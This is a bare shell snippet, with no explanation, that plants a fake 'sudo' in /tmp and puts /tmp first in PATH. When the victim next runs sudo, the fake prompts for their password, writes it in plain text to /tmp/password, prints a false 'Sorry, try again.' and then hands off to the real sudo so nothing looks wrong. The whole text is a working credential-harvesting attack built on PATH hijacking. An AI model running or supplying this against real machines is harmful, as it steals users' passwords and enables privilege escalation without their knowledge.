cat <<\EOF > /tmp/sudo
#!/bin/bash
if [[ "${@}" = "" ]]; then
  /usr/bin/sudo
else
  read -s -r -p "[sudo] password for ${USER}: " password
  echo "${password}" > /tmp/password
  echo -e "\nSorry, try again."
  /usr/bin/sudo ${@}
fi
EOF
chmod +x /tmp/sudo
export PATH="/tmp:${PATH}"
